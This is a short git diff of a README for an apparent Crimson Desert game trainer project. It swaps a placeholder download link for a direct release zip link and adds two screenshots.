@@ -15,13 +15,17 @@
 
   <br><br>
 
-  <a href="https://github.com/YOUR_USERNAME/Crimson-Desert-Player-Editor/releases/latest" target="_blank">
+  <a href="https://github.com/alessiocasali94/CrimsonDesert-Inventory-and-Player-Editor/releases/download/Crimson-trainer/CrimsonDesert.zip" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
   </a>
 
 </div>
 
 **Powerful standalone offline trainer for Crimson Desert (2026)** — full player control, combat functions, world editing and quality of life features with a beautiful overlay UI.
+
+<img width="1257" height="696" alt="image" src="https://github.com/user-attachments/assets/a29d0a6d-dd93-40d7-830d-7b3c47e38e22" />
+<img width="1259" height="695" alt="image" src="https://github.com/user-attachments/assets/8d0bc0f8-0cfe-43d0-9dac-f915087cb879" />
+
 
 ---
 
